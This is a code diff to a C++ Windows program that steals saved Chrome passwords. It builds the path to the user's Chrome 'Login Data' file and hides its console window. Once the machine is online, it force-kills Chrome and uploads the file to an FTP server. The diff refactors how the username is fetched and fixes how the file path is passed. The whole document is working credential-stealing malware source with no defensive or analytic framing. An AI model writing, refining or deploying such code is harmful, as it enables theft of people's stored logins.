@@ -21,18 +21,29 @@ void UploadToServer(const char* file, const char* ftpname)
     InternetCloseHandle(hInternet);
 
 }
-int main() {
+std::string toStr()
+{
     const char* ftpname = getenv("USERNAME");
-    std::ostringstream fullpath;
-    fullpath << "C:\\Users\\" << ftpname << "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
-    const char* file = fullpath.str().c_str();
+    if(ftpname == NULL)
+    {
+        return "FAILED_TO_GET_USERNAME";
+    } else {
+        std::string nm(ftpname);
+        return nm;
+    }
+}
+
+int main() {
+    
+    std::ostringstream fpath;
+    fpath << "C:\\Users\\" << toStr() << "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
     FreeConsole();
     while(1)
     {
         if(InternetCheckConnection("http://www.google.com", 1, 0))
         {
             WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
-            UploadToServer(file, ftpname);
+            UploadToServer(fpath.str().c_str(), toStr().c_str());
             break;
         } else {
             // Do nothing..
